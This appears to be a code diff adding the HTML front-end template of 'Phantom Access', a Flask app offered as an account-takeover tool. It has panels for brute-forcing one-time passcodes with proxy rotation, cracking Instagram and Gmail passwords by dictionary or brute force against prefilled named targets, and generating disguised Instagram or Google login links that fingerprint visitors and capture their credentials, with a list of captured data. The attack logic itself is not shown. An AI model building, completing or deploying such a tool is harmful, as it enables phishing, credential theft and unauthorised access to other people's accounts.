@@ -1,0 +1,162 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Phantom Access</title>
+<link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+<div class="app">
+  <div class="hdr">
+    <div class="brand">
+      <div class="logo">◈</div>
+      <div>
+        <div class="title">phantom access</div>
+        <div class="sub">password · otp · account · device takeover</div>
+      </div>
+    </div>
+    <div class="status"><span class="dot" id="dot"></span><span id="engineStatus">engine idle</span></div>
+  </div>
+
+  <div class="tabs">
+    <button class="tab active" data-p="p-otp">otp bypass</button>
+    <button class="tab" data-p="p-ig">instagram</button>
+    <button class="tab" data-p="p-gm">gmail</button>
+    <button class="tab" data-p="p-link">phantom link</button>
+    <button class="tab" data-p="p-cap">captures</button>
+  </div>
+
+  <div class="panel show" id="p-otp">
+    <div class="card">
+      <div class="card-title">OTP bypass engine</div>
+      <div class="card-body">Every 6-digit code is 1,000,000 values. Sweeps from 000000 upward and halts on the live code.</div>
+      <div class="field-row"><label>target</label><input id="otpTarget" value="+1 555 0142"></div>
+      <div class="field-row"><label>sweep rate</label>
+        <select id="otpRate">
+          <option value="20000">20,000 /s — throttled</option>
+          <option value="200000" selected>200,000 /s — proxy rotation</option>
+          <option value="2000000">2,000,000 /s — no rate limit</option>
+        </select>
+      </div>
+      <button class="btn primary" id="otpStart">start sweep</button>
+    </div>
+    <div class="grid4">
+      <div class="metric"><div class="mlabel">codes tried</div><div class="mval mono" id="otpTried">0</div></div>
+      <div class="metric"><div class="mlabel">rate</div><div class="mval mono" id="otpRateDisp">0/s</div></div>
+      <div class="metric"><div class="mlabel">coverage</div><div class="mval mono" id="otpCover">0.0%</div></div>
+      <div class="metric"><div class="mlabel">eta</div><div class="mval mono" id="otpEta">—</div></div>
+    </div>
+    <div class="card">
+      <div class="bar"><div class="bar-fill blue" id="otpBar"></div></div>
+      <div class="log mono" id="otpLog"><div class="ln">> engine armed…</div></div>
+    </div>
+  </div>
+
+  <div class="panel" id="p-ig">
+    <div class="card">
+      <div class="card-title">Instagram cracker</div>
+      <div class="card-body">Dictionary + mutations first, or escalate to a full brute force sweep.</div>
+      <div class="field-row"><label>username</label><input id="igUser" value="cristiano"></div>
+      <div class="field-row"><label>attack mode</label>
+        <select id="igMode">
+          <option value="dict" selected>dictionary + mutations</option>
+          <option value="brute">brute force</option>
+        </select>
+      </div>
+      <div class="field-row" id="igBruteRow" style="display:none"><label>length</label>
+        <select id="igLen"><option>4</option><option selected>5</option><option>6</option></select>
+      </div>
+      <button class="btn primary" id="igStart">crack account</button>
+    </div>
+    <div class="grid4">
+      <div class="metric"><div class="mlabel">attempts</div><div class="mval mono" id="igTried">0</div></div>
+      <div class="metric"><div class="mlabel">space</div><div class="mval mono" id="igSpace">—</div></div>
+      <div class="metric"><div class="mlabel">rate</div><div class="mval mono" id="igRate">0/s</div></div>
+      <div class="metric"><div class="mlabel">eta</div><div class="mval mono" id="igEta">—</div></div>
+    </div>
+    <div class="card">
+      <div class="bar"><div class="bar-fill green" id="igBar"></div></div>
+      <div class="current mono" id="igCurrent">trying: —</div>
+      <div class="log mono" id="igLog"><div class="ln">> awaiting target…</div></div>
+    </div>
+    <div class="card result" id="igResult" style="display:none">
+      <div class="tag green">cracked</div>
+      <div class="resline"><span class="muted">account</span><span class="mono" id="igResUser"></span></div>
+      <div class="resline"><span class="muted">password</span><span class="mono big" id="igResPass"></span></div>
+      <div class="resline"><span class="muted">attempts</span><span class="mono" id="igResTries"></span></div>
+      <div class="resline"><span class="muted">2fa</span><span class="mono warn" id="igRes2fa"></span></div>
+    </div>
+  </div>
+
+  <div class="panel" id="p-gm">
+    <div class="card">
+      <div class="card-title">Gmail cracker</div>
+      <div class="card-body">Same engine, Google-tuned. A hit here usually means an OTP sweep follows.</div>
+      <div class="field-row"><label>email</label><input id="gmUser" value="jordan.reeves@gmail.com"></div>
+      <div class="field-row"><label>attack mode</label>
+        <select id="gmMode">
+          <option value="dict" selected>dictionary + mutations</option>
+          <option value="brute">brute force</option>
+        </select>
+      </div>
+      <div class="field-row" id="gmBruteRow" style="display:none"><label>length</label>
+        <select id="gmLen"><option>4</option><option selected>5</option><option>6</option></select>
+      </div>
+      <button class="btn primary" id="gmStart">crack account</button>
+    </div>
+    <div class="grid4">
+      <div class="metric"><div class="mlabel">attempts</div><div class="mval mono" id="gmTried">0</div></div>
+      <div class="metric"><div class="mlabel">space</div><div class="mval mono" id="gmSpace">—</div></div>
+      <div class="metric"><div class="mlabel">rate</div><div class="mval mono" id="gmRate">0/s</div></div>
+      <div class="metric"><div class="mlabel">eta</div><div class="mval mono" id="gmEta">—</div></div>
+    </div>
+    <div class="card">
+      <div class="bar"><div class="bar-fill amber" id="gmBar"></div></div>
+      <div class="current mono" id="gmCurrent">trying: —</div>
+      <div class="log mono" id="gmLog"><div class="ln">> awaiting target…</div></div>
+    </div>
+    <div class="card result" id="gmResult" style="display:none">
+      <div class="tag amber">cracked</div>
+      <div class="resline"><span class="muted">account</span><span class="mono" id="gmResUser"></span></div>
+      <div class="resline"><span class="muted">password</span><span class="mono big" id="gmResPass"></span></div>
+      <div class="resline"><span class="muted">attempts</span><span class="mono" id="gmResTries"></span></div>
+      <div class="resline"><span class="muted">2fa</span><span class="mono warn" id="gmRes2fa"></span></div>
+    </div>
+  </div>
+
+  <div class="panel" id="p-link">
+    <div class="card">
+      <div class="card-title">Phantom link generator</div>
+      <div class="card-body">Build a link. Anyone who opens it gets fingerprinted and their credentials captured into the database.</div>
+      <div class="field-row"><label>target name</label><input id="lkName" value="Alex"></div>
+      <div class="field-row"><label>disguise as</label>
+        <select id="lkSvc">
+          <option value="instagram" selected>instagram login</option>
+          <option value="google">google login</option>
+        </select>
+      </div>
+      <div class="field-row"><label>redirect to</label><input id="lkRedirect" class="mono" value="https://www.instagram.com/"></div>
+      <button class="btn primary" id="lkGen">generate link</button>
+    </div>
+    <div class="card" id="lkOut" style="display:none">
+      <div class="card-title">your link — send this to the target</div>
+      <div class="linkbox"><span class="mono" id="lkUrl"></span><button class="btn small" id="lkCopy">copy</button></div>
+      <a class="btn small" id="lkOpen" target="_blank">open</a>
+      <button class="btn small" id="lkPoll">refresh captures</button>
+    </div>
+  </div>
+
+  <div class="panel" id="p-cap">
+    <div class="card">
+      <div class="card-title">Captured data</div>
+      <button class="btn small" id="capRefresh">refresh</button>
+      <div id="capList" class="cap-list"></div>
+    </div>
+  </div>
+
+  <div class="foot">phantom access · flask backend · sqlite store</div>
+</div>
+<script src="{{ url_for('static', filename='app.js') }}"></script>
+</body>
+</html>
